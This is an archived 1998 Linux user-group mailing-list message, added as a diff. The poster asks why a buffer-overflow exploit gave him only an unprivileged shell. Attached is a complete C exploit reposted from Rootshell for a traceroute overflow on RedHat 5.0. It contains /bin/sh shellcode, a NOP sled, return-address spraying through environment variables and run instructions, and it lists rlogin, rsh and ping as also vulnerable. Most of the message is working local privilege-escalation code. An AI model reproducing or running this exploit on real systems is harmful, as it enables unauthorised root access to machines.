@@ -1,0 +1,211 @@
+<!-- MHonArc v2.2.0 -->
+<!--X-Subject: tlug: Security naive question! -->
+<!--X-From: Rafael Coninck Teigao <rct@example.com> -->
+<!--X-Date:  Sat, 11 Jul 1998 12:26:46 +0900 -->
+<!--X-Message-Id: 35A6DA78.594A4DB7@example.com -->
+<!--X-ContentType: multipart/mixed -->
+<!--X-Head-End-->
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<html>
+<head>
+  <title>TLUG Mailing List</title>
+  <meta http-equiv="Content-type" content="text/html">
+  <meta name="Author" content="Jim Schweizer - webmaster TLUG">
+  <meta http-equiv="keywords" content="Tokyo Linux Users Group mailing list archive.">
+</head>
+ 
+<body bgcolor="#FFFFFF" text="#000000" BACKGROUND="../back3grnd.gif">
+<BLOCKQUOTE>
+<CENTER><IMG SRC="../tlug_logo.gif"><BR>Mailing List Archive</CENTER>
+<!--X-Body-Begin-->
+<!--X-User-Header-->
+<P>
+<font color="blue">
+Support open source code!
+</font>
+<!--X-User-Header-End-->
+<!--X-TopPNI-->
+<HR>
+[<A HREF="msg00197.html">Date Prev</A>][<A HREF="msg00199.html">Date Next</A>][<A HREF="msg00231.html">Thread Prev</A>][<A HREF="msg00199.html">Thread Next</A>][<A HREF="maillist.html#00198">Date Index</A>][<A HREF="threads.html#00198">Thread Index</A>]
+<!--X-TopPNI-End-->
+<!--X-MsgBody-->
+<!--X-Subject-Header-Begin-->
+<H1>tlug: Security naive question!</H1>
+<HR>
+<!--X-Subject-Header-End-->
+<UL>
+<LI><strong>To</strong>: <strong>TLUG &lt;<A HREF="mailto:tlug@example.com">tlug@example.com</A>&gt;</strong></LI>
+<LI><strong>Subject</strong>: <strong>tlug: Security naive question!</strong></LI>
+<LI><strong>From</strong>: <strong>Rafael Coninck Teigao &lt;<A HREF="mailto:rct@example.com">rct@example.com</A>&gt;</strong></LI>
+<LI>Date: Sat, 11 Jul 1998 03:22:32 +0000</LI>
+<LI>Content-Type: multipart/mixed; boundary="------------C1FF6DE23591950E83E47AAB"</LI>
+<LI>Reply-To: <A HREF="mailto:tlug@example.com">tlug@example.com</A></LI>
+<LI>Sender: <A HREF="mailto:owner-tlug@example.com">owner-tlug@example.com</A></LI>
+</UL>
+<!--X-Head-Body-Sep-Begin-->
+<HR>
+<!--X-Head-Body-Sep-End-->
+<!--X-Body-of-Message-->
+<PRE>
+Hi, I's reading about security on buffer overflow, and could manage to
+find out how this kind of error may give root access to regular user...a
+program I folowed line-to-line to try gainning root on my machine simple
+opened a usual shell, no previleges!
+
+[]'s
+    RCT
+</PRE>
+<PRE>
+
+                         Please visit our sponsors.
+                                      
+   Return to index | Download NON-HTML Version | Add Comment | View
+   Comments (0 comment(s))
+
+/*
+
+[ <A TARGET="_top" HREF="http://www.rootshell.com/">http://www.rootshell.com/</A> ]
+
+   Just Your Standard EGGSHELL Proggie:
+   traceroute buffer overflow exploit for RedHat Linux 5.0
+   mostly ripped from Aleph One &lt;aleph1@example.com&gt;
+
+   Wilton Wong
+   wwong@example.com
+
+   gcc -o trace_shell trace_shell.c
+
+*/
+#include &lt;stdlib.h&gt;
+
+#define DEFAULT_OFFSET                 0
+#define DEFAULT_BUFFER_SIZE            1019
+#define DEFAULT_EGG_SIZE               2048
+#define NOP                            0x90
+
+char shellcode[] =
+        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+        "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+unsigned long get_sp(void) {
+   __asm__("movl %esp,%eax");
+}
+
+void main(int argc, char *argv[]) {
+  char *buff, *ptr, *egg;
+  long *addr_ptr, addr;
+  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
+  int i, eggsize=DEFAULT_EGG_SIZE;
+
+  if (argc &gt; 1) bsize  = atoi(argv[1]);
+  if (argc &gt; 2) offset = atoi(argv[2]);
+  if (argc &gt; 3) eggsize = atoi(argv[3]);
+
+  if (!(buff = malloc(bsize))) {
+    printf("Can't allocate memory.\n");
+    exit(0);
+  }
+  if (!(egg = malloc(eggsize))) {
+    printf("Can't allocate memory.\n");
+    exit(0);
+  }
+
+  addr = get_sp() - offset;
+  printf("Using address: 0x%x\n", addr);
+
+  ptr = buff;
+  addr_ptr = (long *) ptr;
+  for (i = 0; i &lt; bsize; i+=4)
+    *(addr_ptr++) = addr;
+
+  ptr = egg;
+  for (i = 0; i &lt; eggsize - strlen(shellcode) - 1; i++)
+    *(ptr++) = NOP;
+
+  for (i = 0; i &lt; strlen(shellcode); i++)
+    *(ptr++) = shellcode[i];
+
+  buff[bsize - 1] = '\0';
+  egg[eggsize - 1] = '\0';
+
+  memcpy(egg,"EGG=",4);
+  putenv(egg);
+  memcpy(buff,"RET=",4);
+  putenv(buff);
+  printf("Now run: /usr/sbin/traceroute $RET\n");
+  system("/bin/bash");
+}
+
+
+
+
+
+
+-------------------------------------------------------------------------
+
+
+On Redhat 5.0,
+
+There are also vunerable to buffer overruns in:
+
+/usr/bin/rlogin
+/usr/bin/rsh
+/usr/sbin/ping
+     _________________________________________________________________
+   
+   © 1998 Rootshell - Unauthorized duplication prohibited.
+</PRE>
+
+<!--X-Body-of-Message-End-->
+<!--X-MsgBody-End-->
+<!--X-Follow-Ups-->
+<HR>
+<!--X-Follow-Ups-End-->
+<!--X-References-->
+<!--X-References-End-->
+<!--X-BotPNI-->
+<UL>
+<LI>Prev by Date:
+<STRONG><A HREF="msg00197.html">tlug: where is the linux netscape for free.</A></STRONG>
+</LI>
+<LI>Next by Date:
+<STRONG><A HREF="msg00199.html">tlug: netscape linux</A></STRONG>
+</LI>
+<LI>Prev by thread:
+<STRONG><A HREF="msg00231.html">Re: tlug: where is the linux netscape for free.</A></STRONG>
+</LI>
+<LI>Next by thread:
+<STRONG><A HREF="msg00199.html">tlug: netscape linux</A></STRONG>
+</LI>
+<LI>Index(es):
+<UL>
+<LI><A HREF="maillist.html#00198"><STRONG>Date</STRONG></A></LI>
+<LI><A HREF="threads.html#00198"><STRONG>Thread</STRONG></A></LI>
+</UL>
+</LI>
+</UL>
+
+<!--X-BotPNI-End-->
+<!--X-User-Footer-->
+<strong>
+<a href="../index.html">Home</a> |
+<a href="maillist.html">Main Index</a> |
+<a href="threads.html">Thread Index</a>
+</strong>
+<!--X-User-Footer-End-->
+ 
+<P>
+<CENTER>
+ <table border=2 width=75%><tr><td align=center>
+<a href="../../index.html"> Home Page</a></td>
+<td align=center><a href="../../list.html"> Mailing List </a></td>
+<td align=center><a href="../../linuxinjapan.html"> Linux and Japan </a></td>
+<td align=center><a href="../../members.html">TLUG Members</a></td>
+<td align=center><a href="../../linuxlinks.html">Links</a></td>
+</tr></TABLE>
+<P>
+</CENTER>
+</BLOCKQUOTE>
+</body>
+</html>
